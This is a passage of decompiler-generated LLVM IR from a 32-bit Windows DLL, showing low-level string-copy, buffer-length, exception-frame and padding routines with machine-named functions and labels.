dec_label_pc_1000519c:                            ; preds = %dec_label_pc_10005191, %dec_label_pc_1000518d
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %.reload = load i32, i32* %.reg2mem, !insn.addr !2367
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %30 = load i32, i32* %5, align 4, !insn.addr !2368
  %31 = icmp ult i32 %30, 16, !insn.addr !2368
  %storemerge = select i1 %31, i32 %3, i32 %arg2
  %32 = add i32 %esp.0, -4, !insn.addr !2369
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2369
  store i32 %arg2, i32* %33, align 4, !insn.addr !2369
  %34 = add i32 %storemerge, %.reload, !insn.addr !2370
  %35 = add i32 %esp.0, -8, !insn.addr !2371
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2371
  store i32 %7, i32* %36, align 4, !insn.addr !2371
  %37 = add i32 %esp.0, -12, !insn.addr !2372
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2372
  store i32 %34, i32* %38, align 4, !insn.addr !2372
  %39 = call i32 @_memcpy.12(), !insn.addr !2373
  store i32 %21, i32* %.pre4, align 4, !insn.addr !2374
  %40 = load i32, i32* %5, align 4, !insn.addr !2375
  %41 = icmp ult i32 %40, 16, !insn.addr !2375
  br i1 %41, label %dec_label_pc_100051d0, label %dec_label_pc_100051c1, !insn.addr !2376

dec_label_pc_100051c1:                            ; preds = %dec_label_pc_1000519c
  %42 = add i32 %21, %arg2, !insn.addr !2377
  %43 = inttoptr i32 %42 to i8*, !insn.addr !2377
  store i8 0, i8* %43, align 1, !insn.addr !2377
  ret i32 %3, !insn.addr !2378

dec_label_pc_100051d0:                            ; preds = %dec_label_pc_1000519c
  %44 = add i32 %21, %3, !insn.addr !2379
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2379
  store i8 0, i8* %45, align 1, !insn.addr !2379
  br label %dec_label_pc_100051d6, !insn.addr !2379

dec_label_pc_100051d6:                            ; preds = %dec_label_pc_100051d0, %dec_label_pc_10005161
  ret i32 %3, !insn.addr !2380

dec_label_pc_100051df:                            ; preds = %dec_label_pc_10005152
  %46 = call i32 @function_10004f70(i32 %0, i32 %1), !insn.addr !2381
  %47 = call i32 @__asm_int3(), !insn.addr !2382
  %48 = call i32 @__asm_int3(), !insn.addr !2383
  %49 = call i32 @__asm_int3(), !insn.addr !2384
  %50 = call i32 @__asm_int3(), !insn.addr !2385
  %51 = call i32 @__asm_int3(), !insn.addr !2386
  %52 = call i32 @__asm_int3(), !insn.addr !2387
  %53 = call i32 @__asm_int3(), !insn.addr !2388
  %54 = call i32 @__asm_int3(), !insn.addr !2389
  %55 = call i32 @__asm_int3(), !insn.addr !2390
  %56 = call i32 @__asm_int3(), !insn.addr !2391
  %57 = call i32 @__asm_int3(), !insn.addr !2392
  %58 = call i32 @__asm_int3(), !insn.addr !2393
  ret i32 %58, !insn.addr !2393
}

define i32 @function_100051f0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100051f0:
  %ebx.0.reg2mem = alloca i32, !insn.addr !2394
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2394
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = sext i8 %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %5 = add nsw i32 %4, 16, !insn.addr !2395
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2395
  %7 = load i32, i32* %6, align 4, !insn.addr !2395
  %8 = icmp ult i32 %7, %arg2, !insn.addr !2396
  br i1 %8, label %dec_label_pc_100052bc, label %dec_label_pc_10005209, !insn.addr !2397

dec_label_pc_10005209:                            ; preds = %dec_label_pc_100051f0
  %9 = sub i32 %7, %arg2, !insn.addr !2398
  %10 = add i32 %3, 16, !insn.addr !2399
  %11 = inttoptr i32 %10 to i32*, !insn.addr !2399
  %12 = load i32, i32* %11, align 4, !insn.addr !2399
  %13 = icmp ult i32 %9, %arg3, !insn.addr !2400
  %14 = select i1 %13, i32 %9, i32 %arg3, !insn.addr !2401
  %15 = sub i32 0, %12
  %16 = sub i32 %15, 1
  %17 = icmp ult i32 %14, %16
  br i1 %17, label %dec_label_pc_10005225, label %dec_label_pc_100052c1, !insn.addr !2402

dec_label_pc_10005225:                            ; preds = %dec_label_pc_10005209
  %18 = icmp eq i32 %14, 0, !insn.addr !2403
  br i1 %18, label %dec_label_pc_100052b3, label %dec_label_pc_1000522f, !insn.addr !2404

dec_label_pc_1000522f:                            ; preds = %dec_label_pc_10005225
  %19 = add i32 %12, %14, !insn.addr !2405
  %20 = icmp eq i32 %19, 0, !insn.addr !2406
  %21 = icmp eq i1 %20, false, !insn.addr !2407
  br i1 %21, label %dec_label_pc_10005256, label %dec_label_pc_10005233, !insn.addr !2407

dec_label_pc_10005233:                            ; preds = %dec_label_pc_1000522f
  store i32 %19, i32* %11, align 4, !insn.addr !2408
  %22 = add i32 %3, 20, !insn.addr !2409
  %23 = inttoptr i32 %22 to i32*, !insn.addr !2409
  %24 = load i32, i32* %23, align 4, !insn.addr !2409
  %25 = icmp ult i32 %24, 16, !insn.addr !2409
  br i1 %25, label %dec_label_pc_1000524a, label %dec_label_pc_1000523c, !insn.addr !2410

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_10005233
  %26 = inttoptr i32 %14 to i8*, !insn.addr !2411
  store i8 0, i8* %26, align 1, !insn.addr !2411
  ret i32 %3, !insn.addr !2412

dec_label_pc_1000524a:                            ; preds = %dec_label_pc_10005233
  %27 = inttoptr i32 %3 to i8*, !insn.addr !2413
  store i8 0, i8* %27, align 1, !insn.addr !2413
  ret i32 %3, !insn.addr !2414

dec_label_pc_10005256:                            ; preds = %dec_label_pc_1000522f
  %28 = add i32 %3, 20, !insn.addr !2415
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2415
  %30 = load i32, i32* %29, align 4, !insn.addr !2415
  %31 = icmp ult i32 %30, %19, !insn.addr !2415
  %32 = icmp eq i1 %31, false, !insn.addr !2416
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !2416
  br i1 %32, label %dec_label_pc_10005269, label %dec_label_pc_1000525b, !insn.addr !2416

dec_label_pc_1000525b:                            ; preds = %dec_label_pc_10005256
  store i32 %19, i32* %stack_var_-20, align 4, !insn.addr !2417
  %33 = call i32 @function_10005f40(i32 %19, i32 %0, i32 %1, i32 %2), !insn.addr !2418
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2419
  br label %dec_label_pc_10005269, !insn.addr !2419

dec_label_pc_10005269:                            ; preds = %dec_label_pc_1000525b, %dec_label_pc_10005256
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %34 = add nsw i32 %4, 20, !insn.addr !2420
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2420
  %36 = load i32, i32* %35, align 4, !insn.addr !2420
  %37 = icmp ult i32 %36, 16, !insn.addr !2420
  store i32 %4, i32* %ebx.0.reg2mem, !insn.addr !2421
  br i1 %37, label %dec_label_pc_10005271, label %dec_label_pc_1000526f, !insn.addr !2421

dec_label_pc_1000526f:                            ; preds = %dec_label_pc_10005269
  %38 = inttoptr i32 %4 to i32*, !insn.addr !2422
  %39 = load i32, i32* %38, align 4, !insn.addr !2422
  store i32 %39, i32* %ebx.0.reg2mem, !insn.addr !2422
  br label %dec_label_pc_10005271, !insn.addr !2422

dec_label_pc_10005271:                            ; preds = %dec_label_pc_1000526f, %dec_label_pc_10005269
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %40 = load i32, i32* %29, align 4, !insn.addr !2423
  %41 = icmp ult i32 %40, 16, !insn.addr !2423
  %storemerge = select i1 %41, i32 %3, i32 %14
  %42 = add i32 %esp.0, -4, !insn.addr !2424
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2424
  store i32 %14, i32* %43, align 4, !insn.addr !2424
  %44 = add i32 %ebx.0.reload, %arg2, !insn.addr !2425
  %45 = add i32 %esp.0, -8, !insn.addr !2426
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2426
  store i32 %44, i32* %46, align 4, !insn.addr !2426
  %47 = load i32, i32* %11, align 4, !insn.addr !2427
  %48 = add i32 %47, %storemerge, !insn.addr !2428
  %49 = add i32 %esp.0, -12, !insn.addr !2429
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2429
  store i32 %48, i32* %50, align 4, !insn.addr !2429
  %51 = call i32 @_memcpy.12(), !insn.addr !2430
  store i32 %19, i32* %11, align 4, !insn.addr !2431
  %52 = load i32, i32* %29, align 4, !insn.addr !2432
  %53 = icmp ult i32 %52, 16, !insn.addr !2432
  br i1 %53, label %dec_label_pc_100052ad, label %dec_label_pc_1000529e, !insn.addr !2433

dec_label_pc_1000529e:                            ; preds = %dec_label_pc_10005271
  %54 = add i32 %19, %14, !insn.addr !2434
  %55 = inttoptr i32 %54 to i8*, !insn.addr !2434
  store i8 0, i8* %55, align 1, !insn.addr !2434
  ret i32 %3, !insn.addr !2435

dec_label_pc_100052ad:                            ; preds = %dec_label_pc_10005271
  %56 = add i32 %19, %3, !insn.addr !2436
  %57 = inttoptr i32 %56 to i8*, !insn.addr !2436
  store i8 0, i8* %57, align 1, !insn.addr !2436
  br label %dec_label_pc_100052b3, !insn.addr !2436

dec_label_pc_100052b3:                            ; preds = %dec_label_pc_100052ad, %dec_label_pc_10005225
  ret i32 %3, !insn.addr !2437

dec_label_pc_100052bc:                            ; preds = %dec_label_pc_100051f0
  %58 = call i32 @function_100063d0(), !insn.addr !2438
  br label %dec_label_pc_100052c1, !insn.addr !2438

dec_label_pc_100052c1:                            ; preds = %dec_label_pc_10005209, %dec_label_pc_100052bc
  %59 = call i32 @function_10004f70(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2439
  %60 = call i32 @__asm_int3(), !insn.addr !2440
  %61 = call i32 @__asm_int3(), !insn.addr !2441
  %62 = call i32 @__asm_int3(), !insn.addr !2442
  %63 = call i32 @__asm_int3(), !insn.addr !2443
  %64 = call i32 @__asm_int3(), !insn.addr !2444
  %65 = call i32 @__asm_int3(), !insn.addr !2445
  %66 = call i32 @__asm_int3(), !insn.addr !2446
  %67 = call i32 @__asm_int3(), !insn.addr !2447
  %68 = call i32 @__asm_int3(), !insn.addr !2448
  %69 = call i32 @__asm_int3(), !insn.addr !2449
  ret i32 %69, !insn.addr !2449
}

define i32 @function_100052d0(i8 %arg1) {
dec_label_pc_100052d0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !2450
  %2 = icmp eq i8 %1, 0, !insn.addr !2450
  %3 = inttoptr i32 %0 to i32*, !insn.addr !2451
  store i32 ptrtoint (i32* @global_var_1002d2f8 to i32), i32* %3, align 4, !insn.addr !2451
  br i1 %2, label %dec_label_pc_100052ed, label %dec_label_pc_100052e2, !insn.addr !2452

dec_label_pc_100052e2:                            ; preds = %dec_label_pc_100052d0
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 8), !insn.addr !2453
  br label %dec_label_pc_100052ed, !insn.addr !2454

dec_label_pc_100052ed:                            ; preds = %dec_label_pc_100052e2, %dec_label_pc_100052d0
  ret i32 %0, !insn.addr !2455
}

define i32 @function_10005300(i32 %arg1) {
dec_label_pc_10005300:
  %ecx.0.reg2mem = alloca i32, !insn.addr !2456
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 20, !insn.addr !2457
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2457
  %3 = load i32, i32* %2, align 4, !insn.addr !2457
  %4 = add i32 %arg1, 16, !insn.addr !2458
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2458
  store i32 0, i32* %5, align 4, !insn.addr !2458
  %6 = add i32 %arg1, 20, !insn.addr !2459
  %7 = inttoptr i32 %6 to i32*, !insn.addr !2459
  store i32 15, i32* %7, align 4, !insn.addr !2459
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !2460
  store i8 0, i8* %8, align 1, !insn.addr !2460
  store i32 %3, i32* %ecx.0.reg2mem, !insn.addr !2461
  br label %dec_label_pc_10005330, !insn.addr !2461

dec_label_pc_10005330:                            ; preds = %dec_label_pc_10005330, %dec_label_pc_10005300
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %9 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !2462
  %10 = load i8, i8* %9, align 1, !insn.addr !2462
  %11 = add i32 %ecx.0.reload, 1, !insn.addr !2463
  %12 = icmp eq i8 %10, 0, !insn.addr !2464
  %13 = icmp eq i1 %12, false, !insn.addr !2465
  store i32 %11, i32* %ecx.0.reg2mem, !insn.addr !2465
  br i1 %13, label %dec_label_pc_10005330, label %dec_label_pc_10005337, !insn.addr !2465

dec_label_pc_10005337:                            ; preds = %dec_label_pc_10005330
  %14 = sub i32 %ecx.0.reload, %3, !insn.addr !2466
  %15 = call i32 @function_10005030(i32 %3, i32 %14), !insn.addr !2467
  ret i32 %arg1, !insn.addr !2468
}

define i32 @function_10005350(i32 %arg1) {
dec_label_pc_10005350:
  %ecx.0.reg2mem = alloca i32, !insn.addr !2469
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !2470
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2470
  %3 = load i32, i32* %2, align 4, !insn.addr !2470
  %4 = add i32 %arg1, 16, !insn.addr !2471
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2471
  store i32 0, i32* %5, align 4, !insn.addr !2471
  %6 = add i32 %arg1, 20, !insn.addr !2472
  %7 = inttoptr i32 %6 to i32*, !insn.addr !2472
  store i32 15, i32* %7, align 4, !insn.addr !2472
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !2473
  store i8 0, i8* %8, align 1, !insn.addr !2473
  store i32 %3, i32* %ecx.0.reg2mem, !insn.addr !2474
  br label %dec_label_pc_10005380, !insn.addr !2474

dec_label_pc_10005380:                            ; preds = %dec_label_pc_10005380, %dec_label_pc_10005350
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %9 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !2475
  %10 = load i8, i8* %9, align 1, !insn.addr !2475
  %11 = add i32 %ecx.0.reload, 1, !insn.addr !2476
  %12 = icmp eq i8 %10, 0, !insn.addr !2477
  %13 = icmp eq i1 %12, false, !insn.addr !2478
  store i32 %11, i32* %ecx.0.reg2mem, !insn.addr !2478
  br i1 %13, label %dec_label_pc_10005380, label %dec_label_pc_10005387, !insn.addr !2478

dec_label_pc_10005387:                            ; preds = %dec_label_pc_10005380
  %14 = sub i32 %ecx.0.reload, %3, !insn.addr !2479
  %15 = call i32 @function_10005030(i32 %3, i32 %14), !insn.addr !2480
  ret i32 %arg1, !insn.addr !2481
}

define i32 @function_100053a0(i32 %arg1) {
dec_label_pc_100053a0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !2482
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !2483
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2483
  %3 = load i32, i32* %2, align 4, !insn.addr !2483
  %4 = add i32 %arg1, 16, !insn.addr !2484
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2484
  store i32 0, i32* %5, align 4, !insn.addr !2484
  %6 = add i32 %arg1, 20, !insn.addr !2485
  %7 = inttoptr i32 %6 to i32*, !insn.addr !2485
  store i32 15, i32* %7, align 4, !insn.addr !2485
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !2486
  store i8 0, i8* %8, align 1, !insn.addr !2486
  store i32 %3, i32* %ecx.0.reg2mem, !insn.addr !2487
  br label %dec_label_pc_100053d0, !insn.addr !2487

dec_label_pc_100053d0:                            ; preds = %dec_label_pc_100053d0, %dec_label_pc_100053a0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %9 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !2488
  %10 = load i8, i8* %9, align 1, !insn.addr !2488
  %11 = add i32 %ecx.0.reload, 1, !insn.addr !2489
  %12 = icmp eq i8 %10, 0, !insn.addr !2490
  %13 = icmp eq i1 %12, false, !insn.addr !2491
  store i32 %11, i32* %ecx.0.reg2mem, !insn.addr !2491
  br i1 %13, label %dec_label_pc_100053d0, label %dec_label_pc_100053d7, !insn.addr !2491

dec_label_pc_100053d7:                            ; preds = %dec_label_pc_100053d0
  %14 = sub i32 %ecx.0.reload, %3, !insn.addr !2492
  %15 = call i32 @function_10005030(i32 %3, i32 %14), !insn.addr !2493
  ret i32 %arg1, !insn.addr !2494
}

define i32 @function_100053f0() {
dec_label_pc_100053f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 13, !insn.addr !2495
  %3 = inttoptr i32 %2 to i8*, !insn.addr !2495
  %4 = load i8, i8* %3, align 1, !insn.addr !2495
  %5 = zext i8 %4 to i32, !insn.addr !2495
  %6 = and i32 %1, -256, !insn.addr !2495
  %7 = or i32 %6, %5, !insn.addr !2495
  ret i32 %7, !insn.addr !2496
}

define i32 @function_10005400() {
dec_label_pc_10005400:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 12, !insn.addr !2497
  %3 = inttoptr i32 %2 to i8*, !insn.addr !2497
  %4 = load i8, i8* %3, align 1, !insn.addr !2497
  %5 = zext i8 %4 to i32, !insn.addr !2497
  %6 = and i32 %1, -256, !insn.addr !2497
  %7 = or i32 %6, %5, !insn.addr !2497
  ret i32 %7, !insn.addr !2498
}

define i32 @function_10005410(i8 %arg1) local_unnamed_addr {
dec_label_pc_10005410:
  %0 = sext i8 %arg1 to i32
  ret i32 %0, !insn.addr !2499
}

define i32 @function_10005430(i8 %arg1) local_unnamed_addr {
dec_label_pc_10005430:
  %0 = sext i8 %arg1 to i32
  ret i32 %0, !insn.addr !2500
}

define i32 @function_10005450() local_unnamed_addr {
dec_label_pc_10005450:
  %eax.0.reg2mem = alloca i32, !insn.addr !2501
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2502
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !2503
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2504
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2505
  %3 = add i32 %0, 4, !insn.addr !2506
  %4 = inttoptr i32 %3 to i32*, !insn.addr !2506
  %5 = load i32, i32* %4, align 4, !insn.addr !2506
  %6 = add i32 %0, 56, !insn.addr !2507
  %7 = add i32 %6, %5, !insn.addr !2507
  %8 = inttoptr i32 %7 to i32*, !insn.addr !2507
  %9 = load i32, i32* %8, align 4, !insn.addr !2507
  %10 = icmp eq i32 %9, 0, !insn.addr !2508
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !2509
  br i1 %10, label %dec_label_pc_10005486, label %dec_label_pc_10005481, !insn.addr !2509

dec_label_pc_10005481:                            ; preds = %dec_label_pc_10005450
  %11 = inttoptr i32 %9 to i32*, !insn.addr !2510
  %12 = load i32, i32* %11, align 4, !insn.addr !2510
  store i32 %12, i32* %eax.0.reg2mem, !insn.addr !2511
  br label %dec_label_pc_10005486, !insn.addr !2511

dec_label_pc_10005486:                            ; preds = %dec_label_pc_10005481, %dec_label_pc_10005450
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %13 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2512
  call void @__writefsdword(i32 0, i32 %13), !insn.addr !2513
  ret i32 %eax.0.reload, !insn.addr !2514
}

define i32 @function_100054a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_100054a0:
  %stack_var_12.2.reg2mem = alloca i32, !insn.addr !2515
  %esp.3.reg2mem = alloca i32, !insn.addr !2515
  %stack_var_12.1.reg2mem = alloca i32, !insn.addr !2515
  %edi.0.reg2mem = alloca i32, !insn.addr !2515
  %esp.0.reg2mem = alloca i32, !insn.addr !2515
  %stack_var_12.0.reg2mem = alloca i32, !insn.addr !2515
  %sext = mul i32 %arg2, 16777216
  %0 = sdiv i32 %sext, 16777216
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp eq i32 %arg5, 0, !insn.addr !2516
  store i32 %0, i32* %stack_var_12.2.reg2mem, !insn.addr !2517
  br i1 %1, label %dec_label_pc_100054f9, label %dec_label_pc_100054af, !insn.addr !2517

dec_label_pc_100054af:                            ; preds = %dec_label_pc_100054a0
  %2 = and i32 %arg4, 255
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2518
  %4 = icmp eq i32 %arg3, 0, !insn.addr !2519
  %5 = add i32 %arg3, 32
  %6 = inttoptr i32 %5 to i32*
  %7 = add i32 %arg3, 48
  %8 = inttoptr i32 %7 to i32*
  %9 = trunc i32 %arg4 to i8
  store i32 %0, i32* %stack_var_12.0.reg2mem, !insn.addr !2520
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !2520
  store i32 %arg5, i32* %edi.0.reg2mem, !insn.addr !2520
  br label %dec_label_pc_100054b3, !insn.addr !2520

dec_label_pc_100054b3:                            ; preds = %dec_label_pc_100054f3, %dec_label_pc_100054af
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  store i32 1, i32* %stack_var_12.1.reg2mem, !insn.addr !2521
  store i32 %esp.0.reload, i32* %esp.3.reg2mem, !insn.addr !2521
  br i1 %4, label %dec_label_pc_100054f3, label %dec_label_pc_100054b7, !insn.addr !2521

dec_label_pc_100054b7:                            ; preds = %dec_label_pc_100054b3
  %stack_var_12.0.reload = load i32, i32* %stack_var_12.0.reg2mem
  %10 = load i32, i32* %6, align 4, !insn.addr !2522
  %11 = inttoptr i32 %10 to i32*, !insn.addr !2523
  %12 = load i32, i32* %11, align 4, !insn.addr !2523
  %13 = icmp eq i32 %12, 0, !insn.addr !2523
  br i1 %13, label %dec_label_pc_100054dc, label %dec_label_pc_100054bf, !insn.addr !2524

dec_label_pc_100054bf:                            ; preds = %dec_label_pc_100054b7
  %14 = load i32, i32* %8, align 4, !insn.addr !2525
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2526
  %16 = load i32, i32* %15, align 4, !insn.addr !2526
  %17 = icmp slt i32 %16, 1
  br i1 %17, label %dec_label_pc_100054dc, label %dec_label_pc_100054c8, !insn.addr !2527

dec_label_pc_100054c8:                            ; preds = %dec_label_pc_100054bf
  %18 = add i32 %16, -1, !insn.addr !2528
  store i32 %18, i32* %15, align 4, !insn.addr !2529
  %19 = load i32, i32* %6, align 4, !insn.addr !2530
  %20 = inttoptr i32 %19 to i32*, !insn.addr !2531
  %21 = load i32, i32* %20, align 4, !insn.addr !2531
  %22 = add i32 %21, 1, !insn.addr !2532
  store i32 %22, i32* %20, align 4, !insn.addr !2533
  %23 = inttoptr i32 %21 to i8*, !insn.addr !2534
  store i8 %9, i8* %23, align 1, !insn.addr !2534
  store i32 %stack_var_12.0.reload, i32* %stack_var_12.1.reg2mem, !insn.addr !2535
  store i32 %esp.0.reload, i32* %esp.3.reg2mem, !insn.addr !2535
  br label %dec_label_pc_100054f3, !insn.addr !2535

dec_label_pc_100054dc:                            ; preds = %dec_label_pc_100054bf, %dec_label_pc_100054b7
  %24 = add i32 %esp.0.reload, -4, !insn.addr !2536
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2536
  store i32 %2, i32* %25, align 4, !insn.addr !2536
  store i32 %stack_var_12.0.reload, i32* %stack_var_12.1.reg2mem, !insn.addr !2537
  store i32 %24, i32* %esp.3.reg2mem, !insn.addr !2537
  br label %dec_label_pc_100054f3, !insn.addr !2537

dec_label_pc_100054f3:                            ; preds = %dec_label_pc_100054b3, %dec_label_pc_100054c8, %dec_label_pc_100054dc
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %stack_var_12.1.reload = load i32, i32* %stack_var_12.1.reg2mem
  %26 = add i32 %edi.0.reload, -1, !insn.addr !2538
  %27 = icmp eq i32 %26, 0, !insn.addr !2538
  %28 = icmp eq i1 %27, false, !insn.addr !2539
  store i32 %stack_var_12.1.reload, i32* %stack_var_12.0.reg2mem, !insn.addr !2539
  store i32 %esp.3.reload, i32* %esp.0.reg2mem, !insn.addr !2539
  store i32 %26, i32* %edi.0.reg2mem, !insn.addr !2539
  store i32 %stack_var_12.1.reload, i32* %stack_var_12.2.reg2mem, !insn.addr !2539
  br i1 %28, label %dec_label_pc_100054b3, label %dec_label_pc_100054f9, !insn.addr !2539

dec_label_pc_100054f9:                            ; preds = %dec_label_pc_100054f3, %dec_label_pc_100054a0
  %stack_var_12.2.reload = load i32, i32* %stack_var_12.2.reg2mem
  %sext4 = mul i32 %stack_var_12.2.reload, 16777216
  %29 = sdiv i32 %sext4, 16777216, !insn.addr !2540
  %30 = add i32 %arg1, 4, !insn.addr !2541
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2541
  store i32 %arg3, i32* %31, align 4, !insn.addr !2541
  %32 = inttoptr i32 %arg1 to i32*, !insn.addr !2542
  store i32 %29, i32* %32, align 4, !insn.addr !2542
  ret i32 %arg1, !insn.addr !2543
}

define i32 @function_10005510(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10005510:
  %stack_var_12.2.reg2mem = alloca i32, !insn.addr !2544
  %esp.3.reg2mem = alloca i32, !insn.addr !2544
  %stack_var_12.1.reg2mem = alloca i32, !insn.addr !2544
  %esi.0.reg2mem = alloca i32, !insn.addr !2544
  %esp.0.reg2mem = alloca i32, !insn.addr !2544
  %ebx.0.reg2mem = alloca i32, !insn.addr !2544
  %stack_var_12.0.reg2mem = alloca i32, !insn.addr !2544
  %sext = mul i32 %arg2, 16777216
  %0 = sdiv i32 %sext, 16777216
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp eq i32 %arg5, 0, !insn.addr !2545
  store i32 %0, i32* %stack_var_12.2.reg2mem, !insn.addr !2546
  br i1 %1, label %dec_label_pc_10005572, label %dec_label_pc_1000551f, !insn.addr !2546

dec_label_pc_1000551f:                            ; preds = %dec_label_pc_10005510
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2547
  %3 = icmp eq i32 %arg3, 0, !insn.addr !2548
  %4 = add i32 %arg3, 32
  %5 = inttoptr i32 %4 to i32*
  %6 = add i32 %arg3, 48
  %7 = inttoptr i32 %6 to i32*
  store i32 %0, i32* %stack_var_12.0.reg2mem, !insn.addr !2549
  store i32 %arg4, i32* %ebx.0.reg2mem, !insn.addr !2549
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !2549
  store i32 %arg5, i32* %esi.0.reg2mem, !insn.addr !2549
  br label %dec_label_pc_10005523, !insn.addr !2549

dec_label_pc_10005523:                            ; preds = %dec_label_pc_1000556b, %dec_label_pc_1000551f
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  store i32 1, i32* %stack_var_12.1.reg2mem, !insn.addr !2550
  store i32 %esp.0.reload, i32* %esp.3.reg2mem, !insn.addr !2550
  br i1 %3, label %dec_label_pc_1000556b, label %dec_label_pc_10005527, !insn.addr !2550

dec_label_pc_10005527:                            ; preds = %dec_label_pc_10005523
  %stack_var_12.0.reload = load i32, i32* %stack_var_12.0.reg2mem
  %8 = load i32, i32* %5, align 4, !insn.addr !2551
  %9 = inttoptr i32 %ebx.0.reload to i8*, !insn.addr !2552
  %10 = load i8, i8* %9, align 1, !insn.addr !2552
  %11 = inttoptr i32 %8 to i32*, !insn.addr !2553
  %12 = load i32, i32* %11, align 4, !insn.addr !2553
  %13 = icmp eq i32 %12, 0, !insn.addr !2553
  br i1 %13, label %dec_label_pc_10005554, label %dec_label_pc_10005534, !insn.addr !2554

dec_label_pc_10005534:                            ; preds = %dec_label_pc_10005527
  %14 = load i32, i32* %7, align 4, !insn.addr !2555
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2556
  %16 = load i32, i32* %15, align 4, !insn.addr !2556
  %17 = icmp slt i32 %16, 1
  br i1 %17, label %dec_label_pc_10005554, label %dec_label_pc_1000553d, !insn.addr !2557

dec_label_pc_1000553d:                            ; preds = %dec_label_pc_10005534
  %18 = add i32 %16, -1, !insn.addr !2558
  store i32 %18, i32* %15, align 4, !insn.addr !2559
  %19 = load i32, i32* %5, align 4, !insn.addr !2560
  %20 = inttoptr i32 %19 to i32*, !insn.addr !2561
  %21 = load i32, i32* %20, align 4, !insn.addr !2561
  %22 = add i32 %21, 1, !insn.addr !2562
  store i32 %22, i32* %20, align 4, !insn.addr !2563
  %23 = inttoptr i32 %21 to i8*, !insn.addr !2564
  store i8 %10, i8* %23, align 1, !insn.addr !2564
  store i32 %stack_var_12.0.reload, i32* %stack_var_12.1.reg2mem, !insn.addr !2565
  store i32 %esp.0.reload, i32* %esp.3.reg2mem, !insn.addr !2565
  br label %dec_label_pc_1000556b, !insn.addr !2565

dec_label_pc_10005554:                            ; preds = %dec_label_pc_10005534, %dec_label_pc_10005527
  %24 = zext i8 %10 to i32, !insn.addr !2552
  %25 = add i32 %esp.0.reload, -4, !insn.addr !2566
  %26 = inttoptr i32 %25 to i32*, !insn.addr !2566
